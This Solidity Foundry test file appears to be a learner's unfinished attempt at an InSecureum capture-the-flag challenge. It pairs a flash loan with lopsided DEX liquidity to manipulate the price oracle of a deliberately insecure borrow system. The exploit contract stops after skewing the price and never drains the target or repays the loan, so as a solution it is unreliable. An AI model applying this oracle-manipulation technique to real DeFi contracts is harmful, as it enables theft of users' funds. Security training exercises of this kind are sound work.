// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";


contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {

        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));
        
        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");

    }

    function testChallenge3() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //============================//
        // voy y pido muchos iSEC flashLoanPool
        // añado colateral
        // ído prestado un poquito de token1
        // add liquidity del token0 al dex 
        // se modifica reserve0, entonces token0 esta barato
        // si vos pediste token1 y tenias token0 de colateral estas undercolat
        // por lo tanto estas para ser liquidado

        console.log('----------------------------------');

        Exploit exploit = new Exploit();
        flashLoanPool.flashLoan(address(exploit), abi.encodeWithSignature('hack(address,address,address,address)',token0, token1, target, oracleDex));


        vm.stopPrank();

        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");

    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {
    

    constructor(){
    }

    function hack(IERC20 _token0, IERC20 _token1, BorrowSystemInsecureOracle _borrowSystem, InsecureDexLP _dex ) external {
        IERC20 token0 = IERC20(_token0);
        IERC20 token1 = IERC20(_token1);
        BorrowSystemInsecureOracle borrowSystem =  BorrowSystemInsecureOracle(_borrowSystem);
        InsecureDexLP dex =  InsecureDexLP(_dex);

        console.log(token0.balanceOf(address(this)));
        console.log(token1.balanceOf(address(this)));

        token0.approve(address(dex), type(uint256).max);
        token1.approve(address(dex), type(uint256).max);

        token0.approve(address(borrowSystem), type(uint256).max);

        borrowSystem.depositToken0(2 ether);
        borrowSystem.borrowToken1(1 ether);

        console.log(token0.balanceOf(address(this)));
        console.log(token1.balanceOf(address(this)));
        console.log('precio antes',borrowSystem.tokenPrice(1000000000000 ether));
        dex.addLiquidity(9990 ether, 1 ether);
        console.log('precio despues',borrowSystem.tokenPrice(1000000000000 ether));
        console.log('despues');

    }
}
